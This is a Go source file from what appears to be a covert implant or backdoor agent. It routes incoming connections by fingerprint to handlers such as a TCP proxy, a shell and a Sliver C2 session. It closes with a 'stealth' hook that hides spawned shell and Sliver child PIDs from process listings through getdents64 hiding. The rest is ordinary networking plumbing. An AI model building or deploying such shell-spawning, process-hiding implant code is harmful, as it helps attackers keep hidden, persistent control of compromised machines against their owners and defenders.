package handler

import (
	"context"
	"net"
	"time"
)

type Handler interface {
	Name() string
	Handle(ctx context.Context, conn net.Conn) error
}

type Rule struct {
	Name        string
	Fingerprint []byte
	Handler     Handler
	Priority    int
}

type Factory func(args map[string]string) (Handler, error)

var registry = map[string]Factory{}

func Register(name string, f Factory) {
	registry[name] = f
}

func Create(name string, args map[string]string) (Handler, error) {
	f, ok := registry[name]
	if !ok {
		return nil, nil
	}
	return f(args)
}

// FingerprintKeeper 标记 handler 需要保留明文指纹字节:
// 指纹本身就是业务数据前缀 (如 tcp_proxy 的 "GET "、sliver 的 TLS ClientHello),
// 加密模式下解密后的数据流前需要把指纹拼回去。
type FingerprintKeeper interface {
	KeepFingerprint()
}

// IdleSetter 支持连接空闲超时的 handler (代理类)。空闲超时到点后连接被关闭。
type IdleSetter interface {
	SetIdleTimeout(time.Duration)
}

// idleConn 活动感知连接: 每次成功读写都刷新读超时, 空闲超过 idle 的连接自然失效。
type idleConn struct {
	net.Conn
	idle time.Duration
}

func newIdleConn(c net.Conn, idle time.Duration) net.Conn {
	if idle <= 0 {
		return c
	}
	return &idleConn{Conn: c, idle: idle}
}

func (c *idleConn) Read(b []byte) (int, error) {
	n, err := c.Conn.Read(b)
	if err == nil && c.idle > 0 {
		c.Conn.SetReadDeadline(time.Now().Add(c.idle))
	}
	return n, err
}

func (c *idleConn) Write(b []byte) (int, error) {
	n, err := c.Conn.Write(b)
	if err == nil && c.idle > 0 {
		c.Conn.SetReadDeadline(time.Now().Add(c.idle))
	}
	return n, err
}

// ---- 子进程 PID 隐藏钩子 (agent 注册 stealth 实现) ----

var pidHider func(uint32)

// SetPidHider 注册子进程 PID 隐藏回调 (getdents64 隐藏)
func SetPidHider(f func(uint32)) { pidHider = f }

// HideChildPid 隐藏一个子进程 PID (shell/sliver 等 spawn 后调用)
func HideChildPid(pid int) {
	if pidHider != nil && pid > 0 {
		pidHider(uint32(pid))
	}
}
